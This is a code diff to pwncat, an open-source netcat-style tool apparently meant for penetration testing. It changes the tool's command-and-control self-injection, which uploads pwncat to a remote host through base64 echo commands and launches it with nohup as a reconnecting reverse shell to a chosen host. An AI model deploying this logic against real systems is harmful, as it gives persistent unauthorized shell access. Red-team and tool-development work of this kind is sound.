-        if not self.__upload_file_base_64_encoded(lpath, rpath_b64):
+        if not self.__upload_file_base_64_encoded(lpath, rpath_b64, True):
             return False
         if not self.__remote_base64_decode(rpath_b64, rpath):
             return False
@@ -3837,6 +4735,78 @@ class CNC(object):
     # --------------------------------------------------------------------------
     # Private Functions
     # --------------------------------------------------------------------------
+    def __set_remote_prefix(self):
+        # type: () -> None
+        """Determines if the remote always sends a specific prefix with its other data."""
+        self.__remote_prefix = []
+        self.__remote_suffix = []
+
+        has_suffix = False
+
+        self.print_info("Checking if remote sends prefix/suffix to every request...")
+        response = self.send_recv(b'echo "__pwn__"\n')
+        expected = b"__pwn__"
+
+        if response:
+            for line in response:
+                # If the line begins with our expected response, all data after that
+                # is a suffix that the server might be sending.
+                if re.match(expected, line):
+                    has_suffix = True
+                    # If bytes are still left after our response, add it
+                    if line.replace(expected, b"", 1):
+                        self.__remote_suffix.append(line.replace(expected, b"", 1))
+                    continue
+                if has_suffix:
+                    self.__remote_suffix.append(line)
+
+        # Ensure empty elements are removed
+        self.__log.debug("Set suffix before: %s", repr(self.__remote_suffix))
+        self.__remote_suffix = [item for item in self.__remote_suffix if item]
+        self.__log.debug("Set suffix after:  %s", repr(self.__remote_suffix))
+
+        if self.__remote_prefix:
+            self.print_info("Remote prefix ({} lines):".format(len(self.__remote_prefix)))
+            for line in self.__remote_prefix:
+                self.print_raw(repr(line).encode(), True)
+        else:
+            self.print_info("Remote does not send prefix")
+        if self.__remote_suffix:
+            self.print_info("Remote suffix ({} lines):".format(len(self.__remote_suffix)))
+            for line in self.__remote_suffix:
+                self.print_raw(repr(line).encode(), True)
+        else:
+            self.print_info("Remote does not send suffix")
+
+    def __get_remote_python_version(self, path):
+        # type: (str) -> Optional[str]
+        """Get remote Python version by path.
+
+        Args:
+            path (str): Path to potential python binary.
+
+        Returns:
+            Optional[str]: Python version string or None if not found.
+        """
+        command = []
+        command.append("{} -c '".format(path))
+        command.append("from __future__ import print_function;")
+        command.append("import sys;")
+        command.append("v=sys.version_info;")
+        command.append('print("{}.{}.{}".format(v[0], v[1], v[2]));\'')
+
+        response = self.remote_command("".join(command), True)
+
+        if response is not None and response:
+            for line in response:
+                match = re.search(b"^([.0-9]+)", line)
+                # Potential version candidate
+                if match:
+                    version = StringEncoder.decode(match.group(1))
+                    if version[0] in ["2", "3"]:
+                        return version
+        return None
+
     def __set_remote_python_path(self):
         # type: () -> bool
         """Enumerate remote Python binary.
@@ -3845,70 +4815,107 @@ class CNC(object):
             bool: Returns `True` on success and `False` on failure.
         """
         # TODO: Make windows compatible
-        for path in self.__PYTHON_PATHS:
-            for version in self.__PYTHON_VERSIONS:
-                python = path + "/" + version
-                self.print_info("Probing for: {}".format(python))
-                self.remote_command("test -f {p} && echo {p} || echo;".format(p=python))
-                for response in self.__frecv():
-                    reg = re.search(r"^([.0-9]+)", response)
-                    if response.rstrip() == python.rstrip():
-                        self.print_info("Potential path: {}".format(python))
-                        command = []
-                        command.append("{} -c '".format(python))
-                        command.append("from __future__ import print_function;")
-                        command.append("import sys;")
-                        command.append("v=sys.version_info;")
-                        command.append('print("{}.{}.{}".format(v[0], v[1], v[2]));\'')
-                        data = "".join(command)
-                        self.remote_command(data)
+        # [1/2] 'which' method
+        for name in self.__PYTHON_NAMES:
+            self.print_info("Probing for: which {}".format(name))
+            response = self.remote_command("which {} 2>/dev/null".format(name), True)
+            if response is not None and response:
+                for line in response:
+                    path = StringEncoder.decode(line)
+                    self.print_info("Potential path: {}".format(path))
+                    version = self.__get_remote_python_version(path)
+                    if version is None:
                         continue
-                    if reg:
-                        match = reg.group(1)
-                        if match[0] == "2":
-                            self.__py3 = False
-                        elif match[0] == "3":
-                            self.__py3 = True
-                        else:
-                            self.print_info(
-                                "Could not determine major version: {}".format(reg.group(1))
-                            )
-                            return False
-                        self.print_info("Found valid Python{} version: {}".format(match[0], match))
-                        self.__python = python
-                        return True
-                    # Nothing matched, break the innter loop
-                    break
+
+                    if version[0] == "2":
+                        self.__remote_py3 = False
+                    if version[0] == "3":
+                        self.__remote_py3 = True
+                    self.print_info("Found valid Python{} version: {}".format(version[0], version))
+                    self.__remote_python = path
+                    return True
+
+        # TODO: Make windows compatible
+        # [2/2] Absolute path method
+        for path in self.__PYTHON_PATHS:
+            for name in self.__PYTHON_NAMES:
+
+                python = path + "/" + name
+                self.print_info("Probing for: {}".format(python))
+                rpath_lines = self.remote_command(
+                    "test -f {p} && echo {p} || echo".format(p=python), True
+                )
+                if rpath_lines is not None and rpath_lines:
+                    # Reset current round
+                    path_found = False
+
+                    # We expect a length of one, but we handle errors as well.
+                    for rpath_line in rpath_lines:
+                        if StringEncoder.decode(rpath_line).rstrip() == python:
+                            path_found = True
+                            break
+                    if not path_found:
+                        continue
+
+                    # Potential python candidate
+                    self.print_info("Potential path: {}".format(python))
+                    version = self.__get_remote_python_version(python)
+                    if version is None:
+                        continue
+
+                    if version[0] == "2":
+                        self.__remote_py3 = False
+                    if version[0] == "3":
+                        self.__remote_py3 = True
+                    self.print_info("Found valid Python{} version: {}".format(version[0], version))
+                    self.__remote_python = python
+                    return True
         return False
 
-    def __upload_file_base_64_encoded(self, lpath, rpath):
-        # type: (str, str) -> bool
+    def __upload_file_base_64_encoded(self, lpath, rpath, at_once=False):
+        # type: (str, str, bool) -> bool
         """Upload a local file to a base64 encoded remote file.
 
         Args:
             lpath (str): Local path of the file.
             rpath (str): Remote path, where to upload the base64 encoded file.
+            at_once (bool): Send all data at once.
 
         Returns:
             bool: Returns `True` on success and `False` on failure.
         """
         first = True
+        data = []  # type: List[str]
+
         with open(lpath, "r") as fhandle:
             lines = fhandle.readlines()
             count = len(lines)
             curr = 1
             for line in lines:
-                self.print_info(
-                    "Uploading: {} -> {} ({}/{})".format(lpath, rpath, curr, count), False, True
-                )
-                b64 = self.__enc.base64_encode(line)
+                if not at_once:
+                    self.print_info(
+                        "Uploading: {} -> {} ({}/{})".format(lpath, rpath, curr, count), False, True
+                    )
+                b64 = StringEncoder.decode(base64.b64encode(StringEncoder.encode(line)))
                 if first:
-                    self.remote_command('echo "{}" > {}'.format(b64, rpath))
+                    if at_once:
+                        data.append('echo "{}" > "{}"'.format(b64, rpath))
+                    else:
+                        self.remote_command('echo "{}" > "{}"'.format(b64, rpath), False)
                     first = False
                 else:
-                    self.remote_command('echo "{}" >> {}'.format(b64, rpath))
+                    if at_once:
+                        data.append('echo "{}" >> "{}"'.format(b64, rpath))
+                    else:
+                        self.remote_command('echo "{}" >> "{}"'.format(b64, rpath), False)
                 curr += 1
-        self.print_info()
+
+        if at_once:
+            self.print_info("Uploading: {} -> {} ({}/{})".format(lpath, rpath, 1, 1))
+            self.remote_command("\n".join(data), False)
+        else:
+            self.print_info()
+
         # TODO: md5 check if this is legit
         return True
 
@@ -3923,69 +4930,88 @@ class CNC(object):
         Returns:
             bool: Returns `True` on success or `False` on failure.
         """
+        self.flush_receive()
+
         command = []
-        command.append("{} -c 'import base64;".format(self.__python))
+        command.append("{} -c 'import base64;".format(self.__remote_python))
         command.append('f=open("{}", "r");'.format(rpath_source))
         command.append("lines = f.readlines();")
-        if self.__py3:
-            command.append('print("".join([base64.b64decode(l.encode()) for l in lines]));\'')
+        if self.__remote_py3:
+            command.append(
+                'print((b"".join([base64.b64decode(l.encode()) for l in lines])).decode());\''
+            )
         else:
             command.append('print "".join([base64.b64decode(l) for l in lines]);\'')
-        command.append("> {}".format(rpath_target))
+        command.append('> "{}"'.format(rpath_target))
 
         self.print_info("Decoding: {} -> {}".format(rpath_source, rpath_target))
-        self.remote_command("".join(command))
+        self.remote_command("".join(command), False)
         # TODO: validate via md5
         return True
 
 
 # -------------------------------------------------------------------------------------------------
-# [9/11 Command & Control]: (1/2) CNCAutoDeploy
+# [9/11 Command & Control]: (3/3) CNCAutoDeploy
 # -------------------------------------------------------------------------------------------------
 class CNCAutoDeploy(CNC):
     """Command&Control pwncat auto deployment class."""
 
     def __init__(
         self,
-        enc,  # type: StringEncoder
-        send,  # type: Callable[[str], None]
-        recv,  # type: Callable[[], Iterator[str]]
+        network,  # type: IONetwork
         cmd,  # type: str
         host,  # type: str
         ports,  # type: List[int]
     ):
         # type: (...) -> None
         try:
-            super(CNCAutoDeploy, self).__init__(enc, send, recv)
-        except FileNotFoundError:
+            super(CNCAutoDeploy, self).__init__(network)
+        except CNCPythonNotFound:
             return
 
         local_path = os.path.abspath(__file__)
         remote_path = self.create_remote_tmpfile()
+        remote_stdout = self.create_remote_tmpfile()
+        remote_stderr = self.create_remote_tmpfile()
         if remote_path is None:
+            self.print_info("Unable to create tmpfile. Aborting and handing over to current shell.")
             return
         if not self.upload(local_path, remote_path):
+            self.print_info("Unable to upload file. Aborting and handing over to current shell.")
             return
-        # TODO: Ensure pwncat stays running
-        self.__start_pwncat(remote_path, cmd, host, ports)
+        self.__start_pwncat(remote_path, cmd, host, ports, remote_stdout, remote_stderr)
+
+        # We need to wait some time for slow severs
+        self.print_info("Waiting for socket")
+        time.sleep(2)
+        self.flush_receive()
+
+        self.print_info("Done. Handing over to current shell.")
         return
 
-    def __start_pwncat(self, remote_path, binary, host, ports):
-        # type: (str, str, str, List[int]) -> None
+    def __start_pwncat(self, remote_path, binary, host, ports, stdout, stderr):
+        # type: (str, str, str, List[int], Optional[str], Optional[str]) -> None
         for port in ports:
             command = []
             command.append("nohup")
-            command.append(self.python)
+            command.append(self.remote_python)
             command.append(remote_path)
             command.append(host)
             command.append(str(port))
             command.append("--exec {}".format(binary))
             command.append("--reconn")
             command.append("--reconn-wait 1")
+            if stdout is not None and stderr is not None:
+                command.append("> {}".format(stdout))
+                command.append("2> {}".format(stderr))
+            elif stdout is not None:
+                command.append("> {} 2>&1".format(stdout))
+            elif stderr is not None:
+                command.append("> {} 2>&1".format(stderr))
             command.append("&")
             data = " ".join(command)
             print("Starting pwncat rev shell: {}".format(data))
-            self.remote_command(data)
+            self.remote_command(data, False)
 
 
 # #################################################################################################
@@ -4506,6 +5532,27 @@ CR on MacOS).
 """,
     )
     optional.add_argument(
+        "--send-on-eof",
+        action="store_true",
+        default=False,
+        help="""Buffer data received on stdin until EOF and send
+everything in one chunk.
+
+""",
+    )
+    optional.add_argument(
+        "--no-shutdown",
+        action="store_true",
+        default=False,
+        help="""Do not shutdown into half-duplex mode.
+If this option is passed, pwncat won't invoke shutdown
+on a socket after seeing EOF on stdin. This is provided
+for backward-compatibility with OpenBSD netcat, which
+exhibits this behavior.
+
+""",
+    )
+    optional.add_argument(
         "-v",
         "--verbose",
         action="count",
@@ -4985,7 +6032,7 @@ The default is to send a null byte sting: '\\0'.
         sys.exit(1)
 
     # Deny unimplemented modes
-    if args.http or args.https:
+    if args.https:
         print("Unimplemented options", file=sys.stderr)
         sys.exit(1)
 
@@ -5085,8 +6132,8 @@ def main():
     # Initialize encoder
     enc = StringEncoder()
 
-    # Initialize StopSignal
-    ssig = StopSignal()
+    # Initialize interrupt handler
+    ssig = InterruptHandler(args.keep_open, args.no_shutdown)
 
     # Initialize transformers
     transformers = []
@@ -5108,7 +6155,7 @@ def main():
         mod = IOCommand(ssig, DsIOCommand(enc, args.cmd, POPEN_BUFSIZE))
     # Use output module
     else:
-        mod = IOStdinStdout(ssig, DsIOStdinStdout(enc, TIMEOUT_READ_STDIN))
+        mod = IOStdinStdout(ssig, DsIOStdinStdout(enc, TIMEOUT_READ_STDIN, args.send_on_eof))
 
     # Run local port-forward
     # -> listen locally and forward traffic to remote (connect)
@@ -5122,7 +6169,7 @@ def main():
         net_srv = IONetwork(ssig, enc, lhost, [lport], "server", srv_opts, cli_opts, sock_opts)
         net_cli = IONetwork(ssig, enc, host, ports, "client", srv_opts, cli_opts, sock_opts)
         # Create Runner
-        run = Runner(PSEStore(ssig, [net_srv, net_cli]))
+        run = Runner(ssig, False, PSEStore(ssig, [net_srv, net_cli]))
         run.add_action(
             "TRANSMIT",
             DsRunnerAction(
@@ -5130,6 +6177,7 @@ def main():
                 net_cli.consumer,  # (send) Data parsed on to PC-CLIENT to send to TARGET
                 [net_cli.interrupt, net_srv.interrupt],
                 transformers,
+                False,
                 None,
             ),
         )
@@ -5140,6 +6188,7 @@ def main():
                 net_srv.consumer,  # (send) Data parsed on to PC-SERVER to back send to USER
                 [net_cli.interrupt, net_srv.interrupt],
                 transformers,
+                False,
                 None,
             ),
         )
@@ -5157,7 +6206,7 @@ def main():
         net_cli_l = IONetwork(ssig, enc, lhost, [lport], "client", srv_opts, cli_opts, sock_opts)
         net_cli_r = IONetwork(ssig, enc, host, ports, "client", srv_opts, cli_opts, sock_opts)
         # Create Runner
-        run = Runner(PSEStore(ssig, [net_cli_l, net_cli_r]))
+        run = Runner(ssig, False, PSEStore(ssig, [net_cli_l, net_cli_r]))
         run.add_action(
             "TRANSMIT",
             DsRunnerAction(
@@ -5165,6 +6214,7 @@ def main():
                 net_cli_r.consumer,  # (send) Data parsed on to PC-CLIENT to send to TARGET
                 [],
                 transformers,
+                False,
                 None,
             ),
         )
@@ -5175,6 +6225,7 @@ def main():
                 net_cli_l.consumer,  # (send) Data parsed on to PC-SERVER to back send to USER
                 [],
                 transformers,
+                False,
                 None,
             ),
         )
@@ -5184,15 +6235,16 @@ def main():
     if mode == "scan":
         print("Scanning {} ports".format(len(ports)))
         net = IONetworkScanner(ssig, enc, host, args.banner, cli_opts, sock_opts)
-        run = Runner(PSEStore(ssig, [net]))
+        run = Runner(ssig, True, PSEStore(ssig, [net]))
         for port in ports:
             run.add_action(
                 "PORT-{}".format(port),
                 DsRunnerAction(
                     DsCallableProducer(net.producer, port),  # Send port scans
                     net.consumer,  # Output results
+                    [net.interrupt],
                     [],
-                    transformers,
+                    True,
                     None,
                 ),
             )
@@ -5208,15 +6260,24 @@ def main():
         if args.self_inject:
             cnc_cmd, cnc_host, cnc_port = args.self_inject.split(":")
             cnc_ports = ArgValidator.get_port_list_from_string(cnc_port)
-            CNCAutoDeploy(enc, net.consumer, net.producer, cnc_cmd, cnc_host, cnc_ports)
-        run = Runner(PSEStore(ssig, [net]))
+            CNCAutoDeploy(net, cnc_cmd, cnc_host, cnc_ports)
+
+        if args.http:
+            trans_recv = [TransformHttpUnpack({})] + transformers
+            trans_send = [TransformHttpPack({"host": host, "reply": "response"})] + transformers
+        else:
+            trans_recv = transformers
+            trans_send = transformers
+
+        run = Runner(ssig, False, PSEStore(ssig, [net]))
         run.add_action(
             "RECV",
             DsRunnerAction(
                 DsCallableProducer(net.producer),  # receive data
                 mod.consumer,
-                [net.interrupt, mod.interrupt],  # Also force the prod. to stop on net err
-                transformers,
+                [net.interrupt],
+                trans_recv,
+                False,
                 code_recv,
             ),
         )
@@ -5225,8 +6286,9 @@ def main():
             DsRunnerAction(
                 DsCallableProducer(mod.producer),
                 net.consumer,  # send data
-                [mod.interrupt],  # Externally stop the produer itself
-                transformers,
+                [mod.interrupt],
+                trans_send,
+                False,
                 code_send,
             ),
         )
@@ -5237,14 +6299,23 @@ def main():
         net = IONetwork(
             ssig, enc, host, ports + args.reconn_robin, "client", srv_opts, cli_opts, sock_opts
         )
-        run = Runner(PSEStore(ssig, [net]))
+
+        if args.http:
+            trans_recv = [TransformHttpUnpack({})] + transformers
+            trans_send = [TransformHttpPack({"host": host, "reply": "response"})] + transformers
+        else:
+            trans_recv = transformers
+            trans_send = transformers
+
+        run = Runner(ssig, False, PSEStore(ssig, [net]))
         run.add_action(
             "RECV",
             DsRunnerAction(
                 DsCallableProducer(net.producer),  # receive data
                 mod.consumer,
-                [net.interrupt, mod.interrupt],  # Also force the prod. to stop on net err
-                transformers,
+                [net.interrupt],
+                trans_recv,
+                False,
                 code_recv,
             ),
         )
@@ -5253,20 +6324,23 @@ def main():
             DsRunnerAction(
                 DsCallableProducer(mod.producer),
                 net.consumer,  # send data
-                [net.interrupt, mod.interrupt],  # Externally stop the produer itself
-                transformers,
+                [mod.interrupt],
+                trans_send,
+                False,
                 code_send,
             ),
         )
         if type(args.ping_intvl) is int and args.ping_intvl > 0:
+            payload = StringEncoder.encode(args.ping_word)
             run.add_timer(
                 "PING-INT",
-                DsRunnerTimer(net.consumer, ssig, args.ping_intvl, (args.ping_word)),  # send data
+                DsRunnerTimer(net.consumer, ssig, args.ping_intvl, (payload,), {}),  # send data
             )
         if args.ping_init:
+            payload = StringEncoder.encode(args.ping_word)
             run.add_repeater(
                 "PING-REP",
-                DsRunnerRepeater(net.consumer, ssig, 1, 0.0, (args.ping_word)),  # send data
+                DsRunnerRepeater(net.consumer, ssig, 1, 0.0, (payload,), {}),  # send data
             )
         run.run()
 
@@ -5275,9 +6349,4 @@ def main():
 # [11/11 MAIN ENTRYPOINT]: (2/2) start
 # -------------------------------------------------------------------------------------------------
 if __name__ == "__main__":
-    # Catch Ctrl+c and exit without error message
-    try:
-        main()
-    except KeyboardInterrupt:
-        print()
-        sys.exit(1)
+    main()
